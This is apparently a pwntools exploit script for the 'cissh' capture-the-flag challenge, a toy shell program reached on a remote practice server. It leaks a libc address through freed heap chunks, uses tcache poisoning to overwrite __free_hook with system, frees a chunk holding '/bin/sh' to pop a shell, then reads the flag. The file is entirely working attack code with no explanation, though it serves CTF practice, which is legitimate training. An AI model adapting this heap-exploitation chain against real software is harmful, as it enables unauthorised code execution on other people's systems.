from pwn import *

elf = None
libc = None
file_name = "./cissh"
#context.timeout = 1


def get_file(dic=""):
    context.binary = dic + file_name
    return context.binary


def get_libc(dic=""):
    libc = None
    try:
        data = os.popen("ldd {}".format(dic + file_name)).read()
        for i in data.split('\n'):
            libc_info = i.split("=>")
            if len(libc_info) == 2:
                if "libc" in libc_info[0]:
                    libc_path = libc_info[1].split(' (')
                    if len(libc_path) == 2:
                        libc = ELF(libc_path[0].replace(' ', ''), checksec=False)
                        return libc
    except:
        pass
    if context.arch == 'amd64':
        libc = ELF('libc64.so')
        #libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    elif context.arch == 'i386':
        try:
            libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
        except:
            libc = ELF("/lib32/libc.so.6", checksec=False)
    return libc





def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if libc == True:
        return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    elif int_mode:
        return_address = int(sh.recvuntil(end_string, drop=True), 16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
    elif context.arch == 'amd64':
        return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
    else:
        return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address


def get_flag(sh):
    sh.recvrepeat(0.1)
    sh.sendline('cat flag')
    return sh.recvrepeat(0.3)


def get_gdb(sh, gdbscript=None, addr=0, stop=False):
    if args['REMOTE']:
        return
    if gdbscript is not None:
        gdb.attach(sh, gdbscript=gdbscript)
    elif addr is not None:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(sh.pid)).readlines()[1], 16)
        log.success("breakpoint_addr --> " + hex(text_base + addr))
        gdb.attach(sh, 'b *{}'.format(hex(text_base + addr)))
    else:
        gdb.attach(sh)
    if stop:
        raw_input()


def Attack(target=None, sh=None, elf=None, libc=None):
    if sh is None:
        from Class.Target import Target
        assert target is not None
        assert isinstance(target, Target)
        sh = target.sh
        elf = target.elf
        libc = target.libc
    assert isinstance(elf, ELF)
    assert isinstance(libc, ELF)
    try_count = 0
    while try_count < 3:
        try_count += 1
        try:
            pwn(sh, elf, libc)
            break
        except KeyboardInterrupt:
            break
        except EOFError:
            if target is not None:
                sh = target.get_sh()
                target.sh = sh
                if target.connect_fail:
                    return 'ERROR : Can not connect to target server!'
            else:
                sh = get_sh()
    flag = get_flag(sh)
    return flag


def touch(name):
    sh.sendlineafter("\x1B[31m$ \x1B[m", "touch " + name)


def vi(name, content):
    sh.sendlineafter("\x1B[31m$ \x1B[m", "vi " + name)
    sh.sendline(content)


def cat(name):
    sh.sendlineafter("\x1B[31m$ \x1B[m", "cat " + name)


def ln(name1, name2):
    sh.sendlineafter("\x1B[31m$ \x1B[m", "ln " + name1 + " " + name2)


def rm(name):
    sh.sendlineafter("\x1B[31m$ \x1B[m", "rm " + name)


def pwn(sh, elf, libc):
    #context.log_level = "debug"
    for i in range(8):
        name = 'a' + str(i)
        touch(name)
        vi(name, str(i) * 0x100)
    ln('b', 'a7')
    ln('c', 'a6')
    for i in range(8):
        name = 'a' + str(i)
        rm(name)
    cat('b')
    libc_base = get_address(sh, True, info="libc_base:\t", offset=-(96 + 0x10 + libc.sym['__malloc_hook']))
    free_hook_addr = libc_base + libc.sym['__free_hook']
    system_addr = libc_base + libc.sym['system']
    vi('c', p64(free_hook_addr))

    touch('d')
    vi('d', '/bin/sh\x00' * (0x100 // 8))
    touch('e')
    vi('e', p64(system_addr) * (0x100 // 8))
    rm('d')
    #gdb.attach(sh)
    sh.interactive()


if __name__ == "__main__":
    sh = remote("node4.buuoj.cn",29916)
    flag = Attack(sh=sh, elf=ELF('./cissh'), libc = ELF('libc64.so'))
    #sh.close()
    log.success('The flag is ' + re.search(r'flag{.+}', flag).group())